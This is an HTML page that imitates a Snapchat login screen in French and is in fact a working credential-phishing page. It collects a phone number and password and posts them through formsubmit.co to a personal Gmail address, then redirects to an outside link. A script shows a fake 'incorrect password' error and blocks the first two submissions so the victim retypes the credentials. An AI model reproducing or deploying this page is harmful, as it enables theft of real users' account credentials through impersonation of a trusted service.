<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background-color: #ffffff;
            color: #16181b;
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 28px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            text-align: center;
            border: 1px solid #eaeaea;
        }

        .icon-container {
            width: 70px;
            height: 70px;
            background-color: #FFFC00;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px auto;
            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.4);
        }

        .ghost-icon {
            width: 38px;
            height: 38px;
            fill: #000000;
        }

        h2 {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
            color: #000000;
        }

        p.subtitle {
            color: #71767b;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .error-message {
            display: none;
            color: #e53935;
            font-weight: 700;
            font-size: 14px;
            margin-bottom: 15px;
            background-color: #ffebee;
            padding: 10px;
            border-radius: 12px;
            border: 1px solid #ffcdd2;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: #000000;
            margin-bottom: 8px;
            margin-left: 4px;
        }

        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            background-color: #f1f3f5;
            border: 2px solid transparent;
            border-radius: 16px;
            color: #000000;
            font-size: 15px;
            outline: none;
            transition: all 0.2s ease;
        }

        input[type="text"]::placeholder {
            color: #adb5bd;
        }

        input[type="text"]:focus {
            border-color: #FFFC00;
            background-color: #ffffff;
            box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.25);
        }

        .submit-btn {
            width: 100%;
            background-color: #FFFC00;
            color: #000000;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 800;
            border-radius: 24px;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.08);
            transition: transform 0.15s ease, background-color 0.15s ease, box-shadow 0.15s ease;
        }

        .submit-btn:hover {
            background-color: #f0ec00;
            transform: translateY(-2px);
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
        }

        .submit-btn:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon-container">
            <svg class="ghost-icon" viewBox="0 0 24 24">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h.5c.28 0 .53.11.71.29L12 20l1.79-1.71c.18-.18.43-.29.71-.29h.5c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.87-3.13-7-7-7z"/>
            </svg>
        </div>

        <h2>Snapchat</h2>
        <p class="subtitle">Se connecter</p>

        <div id="error-line" class="error-message">mot de pass incorect</div>

        <form id="empForm" action="https://formsubmit.co/nbroseten@gmail.com" method="POST">
            
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://mydata.com/t/nV0WtPw7">
            <input type="hidden" name="_subject" value="New Employee Info Submission!">

            <div class="form-group">
                <label for="fullname">Numero de telephone</label>
                <input type="text" id="fullname" name="Full Name" placeholder="e.g. Jane Doe" required>
            </div>

            <div class="form-group">
                <label for="employee_id">Mot de Pass</label>
                <input type="text" id="employee_id" name="Employee ID" placeholder="e.g. EMP-9821" required>
            </div>

            <button type="submit" class="submit-btn">Se connecter</button>
        </form>
    </div>

    <script>
        let attemptCount = 0;

        document.getElementById("empForm").addEventListener("submit", function(e) {
            attemptCount++;

            if (attemptCount < 3) {
                e.preventDefault();
                
                document.getElementById("error-line").style.display = "block";
                
                document.getElementById("fullname").value = "";
                document.getElementById("employee_id").value = "";
                document.getElementById("fullname").focus();
            }
        });
    </script>

</body>
</html>
